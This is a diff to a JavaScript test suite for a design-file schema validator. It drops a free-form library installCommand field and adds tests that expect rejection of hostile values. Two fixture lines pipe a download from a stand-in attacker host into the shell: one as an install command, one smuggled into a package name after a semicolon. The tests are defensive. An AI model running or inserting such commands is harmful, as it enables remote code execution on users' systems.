@@ -290,7 +290,6 @@ describe('design.v1.json schema validation', () => {
           name: 'GSAP',
           package: 'gsap',
           version: '^3.12.5',
-          installCommand: 'npm install gsap',
           purpose: 'scroll-driven entrance animations',
         },
       ];
@@ -341,9 +340,16 @@ describe('design.v1.json schema validation', () => {
       expect(isValid).toBe(false);
     });
 
-    test('libraries entry missing installCommand should fail', () => {
+    test('libraries entry with a free-form installCommand should fail', () => {
       const design = withMotionAndLibraries();
-      delete design.libraries[0].installCommand;
+      design.libraries[0].installCommand = 'curl attacker.example | sh';
+      const isValid = validate(design);
+      expect(isValid).toBe(false);
+    });
+
+    test('libraries entry with an unsafe package specifier should fail', () => {
+      const design = withMotionAndLibraries();
+      design.libraries[0].package = 'gsap; curl attacker.example | sh';
       const isValid = validate(design);
       expect(isValid).toBe(false);
     });
